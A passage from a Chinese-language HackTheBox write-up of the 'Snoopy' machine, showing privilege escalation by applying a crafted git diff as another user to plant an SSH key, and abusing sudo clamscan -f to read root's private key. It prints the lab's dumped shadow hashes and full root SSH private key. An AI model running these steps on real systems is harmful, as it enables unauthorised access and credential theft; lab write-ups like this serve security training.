<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获取一个正常的diff格式，基于这个修改</span></span><br><span class="line">cd /home</span><br><span class="line">git diff cbrown/.bash_history cbrown/.ssh/authorized_keys &gt; /tmp/diff</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改其中的用户名为sbrown，添加公钥内容</span></span><br><span class="line">vim /tmp/diff</span><br><span class="line"></span><br><span class="line">chmod 777 /home/cbrown</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 应用补丁，写入公钥</span></span><br><span class="line">sudo -u sbrown /usr/bin/git apply /tmp/diff</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050818.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="tmp-diff"><a href="#tmp-diff" class="headerlink" title="/tmp/diff"></a>/tmp/diff</h2><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/cbrown/.bash_history b/cbrown/.bash_history</span><br><span class="line">deleted file mode 120000</span><br><span class="line">index dc1dc0c..0000000</span><br><span class="line"><span class="comment">--- a/cbrown/.bash_history</span></span><br><span class="line"><span class="comment">+++ /dev/null</span></span><br><span class="line">@@ -1 +0,0 @@</span><br><span class="line"><span class="deletion">-/dev/null</span></span><br><span class="line">\ No newline at end of file</span><br><span class="line">diff --git a/sbrown/.ssh/authorized_keys b/sbrown/.ssh/authorized_keys</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000..e69de29</span><br><span class="line"><span class="comment">--- /dev/null</span></span><br><span class="line"><span class="comment">+++ b/sbrown/.ssh/authorized_keys</span></span><br><span class="line">@@ -0,0 +1 @@</span><br><span class="line"><span class="addition">+ssh-rsa AAAAAAAAA</span></span><br></pre></td></tr></table></figure>

<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>写入公钥到sbrown后ssh连接：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050819.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h2><p>sudo运行clamscan,查看可用参数</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050820.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>测试发现-f指定文件列表扫描，会把文件内容打印出来，因为他把文件当成列表，去把每一行当成要扫描的文件名，从而产生错误输出：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050821.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>那就直接去读ssh私钥了, 修复格式麻烦点：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/local/bin/clamscan -f /root/.ssh/id_rsa</span><br><span class="line"></span><br><span class="line">ssh -i root_id_rsa root@10.10.11.212</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050822.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$rU7hOwTnG6BpC3LHixl.d.$Bs2WEl7oZNFwYFWNGvW5WPrBf59XWJbulWaR.EVO1y4:19442:0:99999:7:::</span><br><span class="line">cbrown:$y$j9T$klyE893ZriSjZmbfTicAH&#x2F;$5P0yN9&#x2F;M5&#x2F;vPn8a.VSWukMywVwVV&#x2F;FS6hUYFDIM3DWC:19443:0:99999:7:::</span><br><span class="line">sbrown:$y$j9T$CpZTLLqOGPxaXw8KJm8Nv.$HOBA7HQe2Ie7WybP3cjf42VTgIcY6RwN0glhXfjG9k6:19435:0:99999:7:::</span><br></pre></td></tr></table></figure>



<h2 id="root-id-rsa"><a href="#root-id-rsa" class="headerlink" title="root_id_rsa"></a>root_id_rsa</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn </span><br><span class="line">NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth&#x2F;iMUF6W2ogsW0KPFN8MffExz2G9D&#x2F;</span><br><span class="line">4gpYjIcyauPHSrV4fjNGM46AizDTQIoK6MyN4K8PNzYMaVnB6IMG9AVthEu11nYzoqHmBf</span><br><span class="line">hy0cp4EaM3gITa10AMBAbnv2bQyWhVZaQlSQ5HDHt0Dw1mWBue5eaxeuqW3RYJGjKjuFSw</span><br><span class="line">kfWsSVrLTh5vf0gaV1ql59Wc8Gh7IKFrEEcLXLqqyDoprKq2ZG06S2foeUWkSY134Uz9oI</span><br><span class="line">Ctqf16lLFi4Lm7t5jkhW9YzDRha7Om5wpxucUjQCG5dU&#x2F;Ij1BA5jE8G75PALrER&#x2F;4dIp2U</span><br><span class="line">zrXxs&#x2F;2Qqi&#x2F;4TPjFJZ5YyaforTB&#x2F;nmO3DJawo6bclAA762n9bdkvlxWd14vig54yP7SSXU</span><br><span class="line">tPGvP4VpjyL7NcPeO7Jrf62UVjlmdro5xaHnbuKFevyPHXmSQUE4yU3SdQ9lrepY&#x2F;eh4eN</span><br><span class="line">y0QJG7QUv8Z49qHnljwMTCcNeH6Dfc786jXguElzAAAFiAOsJ9IDrCfSAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBANeetM1N4+5hUFLOVwxiGq7Yf4jFBeltqILFtCjxTfDH3xMc9hvQ&#x2F;+IKWIyHMmrj</span><br><span class="line">x0q1eH4zRjOOgIsw00CKCujMjeCvDzc2DGlZweiDBvQFbYRLtdZ2M6Kh5gX4ctHKeBGjN4</span><br><span class="line">CE2tdADAQG579m0MloVWWkJUkORwx7dA8NZlgbnuXmsXrqlt0WCRoyo7hUsJH1rElay04e</span><br><span class="line">b39IGldapefVnPBoeyChaxBHC1y6qsg6KayqtmRtOktn6HlFpEmNd+FM&#x2F;aCAran9epSxYu</span><br><span class="line">C5u7eY5IVvWMw0YWuzpucKcbnFI0AhuXVPyI9QQOYxPBu+TwC6xEf+HSKdlM618bP9kKov</span><br><span class="line">+Ez4xSWeWMmn6K0wf55jtwyWsKOm3JQAO+tp&#x2F;W3ZL5cVndeL4oOeMj+0kl1LTxrz+FaY8i</span><br><span class="line">+zXD3juya3+tlFY5Zna6OcWh527ihXr8jx15kkFBOMlN0nUPZa3qWP3oeHjctECRu0FL&#x2F;G</span><br><span class="line">ePah55Y8DEwnDXh+g33O&#x2F;Oo14LhJcwAAAAMBAAEAAAGABnmNlFyya4Ygk1v+4TBQ&#x2F;M8jhU</span><br><span class="line">flVY0lckfdkR0t6f0Whcxo14z&#x2F;IhqNbirhKLSOV3&#x2F;7jk6b3RB6a7ObpGSAz1zVJdob6tyE</span><br><span class="line">ouU&#x2F;HWxR2SIQl9huLXJ&#x2F;OnMCJUvApuwdjuoH0KQsrioOMlDCxMyhmGq5pcO4GumC2K0cXx</span><br><span class="line">dX621o6B51VeuVfC4dN9wtbmucocVu1wUS9dWUI45WvCjMspmHjPCWQfSW8nYvsSkp17ln</span><br><span class="line">Zvf5YiqlhX4pTPr6Y&#x2F;sLgGF04M&#x2F;mGpqskSdgpxypBhD7mFEkjH7zN&#x2F;dDoRp9ca4ISeTVvY</span><br><span class="line">YnUIbDETWaL+Isrm2blOY160Z8CSAMWj4z5giV5nLtIvAFoDbaoHvUzrnir57wxmq19Grt</span><br><span class="line">7ObZqpbBhX&#x2F;GzitstO8EUefG8MlC+CM8jAtAicAtY7WTikLRXGvU93Q&#x2F;cS0nRq0xFM1OEQ</span><br><span class="line">qb6AQCBNT53rBUZSS&#x2F;cZwdpP2kuPPby0thpbncG13mMDNspG0ghNMKqJ+KnzTCxumBAAAA</span><br><span class="line">wEIF&#x2F;p2yZfhqXBZAJ9aUK&#x2F;TE7u9AmgUvvvrxNIvg57&#x2F;xwt9yhoEsWcEfMQEWwru7y8oH2e</span><br><span class="line">IAFpy9gH0J2Ue1QzAiJhhbl1uixf+2ogcs4&#x2F;F6n8SCSIcyXub14YryvyGrNOJ55trBelVL</span><br><span class="line">BMlbbmyjgavc6d6fn2ka6ukFin+OyWTh&#x2F;gyJ2LN5VJCsQ3M+qopfqDPE3pTr0MueaD4+ch</span><br><span class="line">k5qNOTkGsn60KRGY8kjKhTrN3O9WSVGMGF171J9xvX6m7iDQAAAMEA&#x2F;c6AGETCQnB3AZpy</span><br><span class="line">2cHu6aN0sn6Vl+tqoUBWhOlOAr7O9UrczR1nN4vo0TMW&#x2F;VEmkhDgU56nHmzd0rKaugvTRl</span><br><span class="line">b9MNQg&#x2F;YZmrZBnHmUBCvbCzq&#x2F;4tj45MuHq2bUMIaUKpkRGY1cv1BH+06NV0irTSue&#x2F;r64U</span><br><span class="line">+WJyKyl4k+oqCPCAgl4rRQiLftKebRAgY7+uMhFCo63W5NRApcdO+s0m7lArpj2rVB1oLv</span><br><span class="line">dydq+68CXtKu5WrP0uB1oDp3BNCSh9AAAAwQDZe7mYQ1hY4WoZ3G0aDJhq1gBOKV2HFPf4</span><br><span class="line">9O15RLXne6qtCNxZpDjt3u7646&#x2F;aN32v7UVzGV7tw4k&#x2F;H8PyU819R9GcCR4wydLcB4bY4b</span><br><span class="line">NQ&#x2F;nYgjSvIiFRnP1AM7EiGbNhrchUelRq0RDugm4hwCy6fXt0rGy27bR+ucHi1W+njba6e</span><br><span class="line">SN&#x2F;sjHa19HkZJeLcyGmU34&#x2F;ESyN6HqFLOXfyGjqTldwVVutrE&#x2F;Mvkm3ii&#x2F;0GqDkqW3PwgW</span><br><span class="line">atU0AwHtCazK8AAAAPcm9vdEBzbm9vcHkuaHRiAQIDBA&#x3D;&#x3D;</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>



<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li>DNS Updates with nsupdate - Serverless Industries<br><a href="https://serverless.industries/2020/09/27/dns-nsupdate-howto.en.html" target="_blank" rel="noopener">https://serverless.industries/2020/09/27/dns-nsupdate-howto.en.html</a></li>
<li>Welcome to Paramiko! — Paramiko documentation<br><a href="https://www.paramiko.org/" target="_blank" rel="noopener">https://www.paramiko.org/</a></li>
<li>SSH-MITM - ssh audits made simple — SSH-MITM<br><a href="https://docs.ssh-mitm.at/" target="_blank" rel="noopener">https://docs.ssh-mitm.at/</a></li>
</ul>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    Last updated: <time datetime="2023-09-25T06:43:07.459Z" itemprop="dateUpdated">2023-09-25 14:43:07</time>
</span><br>


        
        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
        
    </div>
    
    <footer>
        <a href="https://darkwing.moe">
            <img src="/img/avatar.jpg" alt="暗羽">
            暗羽
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2023/05/09/Snoopy-HackTheBox/&title=《Snoopy - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2023/05/09/Snoopy-HackTheBox/&title=《Snoopy - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2023/05/09/Snoopy-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Snoopy - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2023/05/09/Snoopy-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2023/05/09/Snoopy-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2023/05/12/CRTO-OSEP%E5%8F%97%E9%A8%93%E8%A8%98/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">CRTO &amp; OSEP受験記</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2023/04/30/MonitorsTwo-HackTheBox/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">MonitorsTwo - HackTheBox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'd35074a248599729ad26',
          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
          repo: 'BlogComments',
          owner: 'zjicmDarkWing',
          admin: ['zjicmDarkWing'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
        </p>
    </div>
    <div class="bottom">
        <p><span>暗羽 &copy; 2014 - 2024</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2023/05/09/Snoopy-HackTheBox/&title=《Snoopy - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2023/05/09/Snoopy-HackTheBox/&title=《Snoopy - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2023/05/09/Snoopy-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Snoopy - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2023/05/09/Snoopy-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2023/05/09/Snoopy-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACJklEQVR42u3awXKDMAxF0fz/T9NtMylwn+R0BvmyYlKDfViosqXXC1/Hr+vzdzL+8/5szNk7F1wyZMh4LOO4vK7HXGP4h0jn/WNGGTJkbMA4m/hsDA+1hEfC9M3sMmTIkAEm4+PJ+2XIkCFjVcCt8fgmVoYMGTLSTSwhXSeF/HN8cS8uQ4aMBzJqW83/uf9KfUOGDBmPYhzhxd/Ak8XaSt7eI0OGjNGMTgEyPUTjbRbFgqgMGTI2YNS2kf3mjPTToOM2GTJkDGKkAY7vInkI7odvGTJkzGakQ/lmtVY26LSXyZAhYyqjs5RV7Red0Pz2f0OGDBmjGXxxtaJjutGN55IhQ8ZoBjlu6y+6FprTYzsZMmTMZnQe6xyxdXrZbra4MmTIGMdIS4ZpwbJ2lMaTVBkyZMxm8CM2Ho7TNK7WbBFUYmXIkDGCQbaytbaMNExzsAwZMvZkpAG31rqRpoBxt4gMGTK2ZKxK4Hhwj2eRIUPGaAZfbm2zmgJajWUyZMjYksELnDyNSwH8XoYMGfsw0saLtLRQa6Ro5bkyZMgYxKi1dnXCbvrszVMyZMgYyjjCi4c/slDye5AUypAhYyijk66lQXnt+FrSKUOGjOcyOkE2nbKWAqIuCxkyZGzA6ARKnlbyA7U09MuQIUNGunEli+blUrJaGTJkyEiLlGuP0lCiKUOGjA0YvLWiPzH5a9zGIUOGjNEMvnVMiwSdRfCDPBkyZIxm/ABaJLJQ+pnlrgAAAABJRU5ErkJggg==" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '死鬼去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
